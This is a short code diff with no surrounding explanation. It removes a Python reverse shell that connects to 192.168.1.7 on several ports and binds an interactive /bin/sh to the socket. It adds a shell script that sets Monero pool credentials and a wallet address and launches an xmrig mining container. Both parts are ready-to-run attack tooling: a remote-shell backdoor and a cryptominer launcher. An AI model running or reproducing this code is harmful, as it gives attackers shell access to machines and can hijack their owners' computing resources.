@@ -1,18 +1,12 @@
-import socket
-import subprocess
-import os
+export POOL_URL="rx.unmineable.com:3333"
+export POOL_USER="45NMFRwkrCKVTDPid126qSdxyAD6XxyvcJ2EkvzPveK9ajsotv7gp2cdCr4aCv8e2G7jLiyfvZDdXSZ4LGAqMj8ZL49buet"
+export POOL_PASS="x"
+export DONATE_LEVEL="0"
 
-def reverse_shell(host, port):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((host, port))
-    os.dup2(s.fileno(), 0)
-    os.dup2(s.fileno(), 1)
-    os.dup2(s.fileno(), 2)
-    p = subprocess.call(["/bin/sh", "-i"])
-
-if __name__ == "__main__":
-    host = "192.168.1.7"
-    ports = [8889, 8890, 8891, 8892]  # Add the list of ports you want to connect to
-
-    for port in ports:
-        reverse_shell(host, port)
+# launch docker container
+docker run --name miner --rm -it \
+    -e POOL_URL=$POOL_URL \
+    -e POOL_USER=$POOL_USER \
+    -e POOL_PASS=$POOL_PASS \
+    -e DONATE_LEVEL=$DONATE_LEVEL \ 
+    metal3d/xmrig
